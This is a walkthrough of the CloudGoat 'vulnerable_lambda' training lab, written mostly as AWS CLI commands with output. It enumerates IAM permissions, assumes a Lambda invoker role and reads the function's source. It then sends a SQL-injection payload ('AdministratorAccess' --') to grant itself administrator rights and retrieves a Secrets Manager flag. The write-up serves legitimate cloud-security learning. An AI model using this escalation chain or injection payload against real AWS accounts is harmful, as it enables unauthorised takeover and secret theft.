# Vulnerable Lambda 
In this scenario, a lambda function will be exploited to escalate privileges and search for secrets.

## Installation
```./cloudgoat.py create vulnerable_lambda

## Enumerate Biblo
1. Assume the biblo user's role
```aws configure --profile biblo
<Add access key, secret access key into the fields>
aws --profile biblo sts get-caller-identity -> Get user name
```
2. Get all the permissions associated with biblo
```
aws iam list-user-policies --user-name <user name> --profile biblo -> get policy name
aws iam get-user-policy --user-name <user name> --policy-name <policy name> --profile biblo

POLICYDOCUMENT  2012-10-17
STATEMENT       sts:AssumeRole  Allow   arn:aws:iam::<account id>:role/cg-lambda-invoker*          
STATEMENT       ['iam:Get*', 'iam:List*', 'iam:SimulateCustomPolicy', 'iam:SimulatePrincipalPolicy']       Allow   *  
```
We can see that the the policy allows us to list roles and assume the lambda role

3. To list roles
```
aws iam list-roles --profile biblo >> roles.txt
```
In roles.txt, we search for the role name that begins with cg-lambda-invoker
4. Identify the associated permissions with the role
```
aws iam list-role-policies --role-name <role name> --profile biblo
aws iam get-role-policy --role-name <role name> --policy-name <policy name> --profile biblo
POLICYDOCUMENT  2012-10-17
STATEMENT       Allow   ['<lambda function arn>', '<2 lambda function arn>']
ACTION  lambda:ListFunctionEventInvokeConfigs
ACTION  lambda:InvokeFunction
ACTION  lambda:ListTags
ACTION  lambda:GetFunction
ACTION  lambda:GetPolicy
STATEMENT       Allow   *
ACTION  lambda:ListFunctions
ACTION  iam:Get*
ACTION  iam:List*
ACTION  iam:SimulateCustomPolicy
ACTION  iam:SimulatePrincipalPolicy
```
We can see that we can get the source function and list functions.

4. Assume the lambda role
```
aws sts assume-role --role-arn <lambda role> --role-session-name biblo --profile biblo --output json
```
5. Add the profile
```
nano ~/.aws/credentials
```
Add the following lines
```
[lambda-biblo]
aws_access_key_id = <access key>
aws_secret_access_key = <secret access key>
aws_session_token = <session token>
```
## Lambda Source Code
1. List lambdas and identify target lambda 
```
aws lambda list-functions --profile lambda-biblo
...
<target lambda function>
"Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay..."
...
```
We then see that the exploit could be database
2. Examine the source code
```
aws lambda get-function --function-name <function name> --profile lambda-biblo
...
CODE    https://prod-04-20xxxx...
...
```
Paste the url into the browser to download the code. We can then see that the code validates our hypothesis above. We can add the policy administrator access to our user as it is in the approved list of policies.
3. Invoke the function with attaching the policies
```
aws --profile lambda-biblo lambda invoke --function-name <function name> --cli-binary-format raw-in-base64-out --payload '{"policy_names":["AdministratorAccess'"'"' --"], "user_name":"<biblo user name>"}' out.txt
cat out.txt -> Check for no errors
```
## Secrets Manager
1. List Secrets
```
aws secretsmanager list-secrets --region us-east-1 --profile biblo --output json
... 
"Name": "vulnerable_lambda_xx... -> id of secret we want
...
```
2. Get the secret 
```
aws secretsmanager get-secret-value --region us-east-1 --secret-id <secret id> --profile biblo --output json
...
"SecretString": "cg-secret-846237-284529" -> Flag!
...
```

# References 
* Challenge: https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/vulnerable_lambda/README.md
